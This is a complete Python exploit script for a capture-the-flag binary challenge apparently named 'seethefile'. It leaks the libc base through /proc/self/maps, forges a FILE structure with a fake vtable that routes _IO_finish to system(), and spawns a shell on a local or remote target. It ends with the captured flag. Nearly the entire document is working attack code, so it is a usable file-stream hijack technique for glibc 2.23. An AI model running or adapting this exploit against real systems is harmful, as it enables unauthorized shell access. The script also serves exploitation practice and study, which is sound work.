#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./seethefile_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
file ./seethefile_patched
# b *0x804890b
b *0x8048ae0
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

sla(b'Your choice :', b'1')
sla(b'What do you want to see :', b'/proc/self/maps')
sla(b'Your choice :', b'2')
sla(b'Your choice :', b'2')
sla(b'Your choice :', b'3')

rl()
if args.LOCAL:
    rl()
    rl()
libc.address = hexleak(rl()[0:8])
slog('libc base @ %#x', libc.address)

# https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/iofclose.c
# https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libio.h#L241
# https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libio.h#L92
# https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L307
fp = p32(0xFFFFDFFF)
fp += b';sh\x00'

payload = fp.ljust(0x20, b'A')
payload += p32(exe.sym.name) # file pointer
payload += b'AAAA' * 10

payload += p32(exe.sym.name + 80) # vtable pointer
payload += p32(0) * 2 # for dummy1 and dummy2
payload += p32(libc.sym.system) # _IO_finish_t

sla(b'Your choice :', b'5')
sla(b'Leave your name :', payload)

interactive()
# FLAG{F1l3_Str34m_is_4w3s0m3}
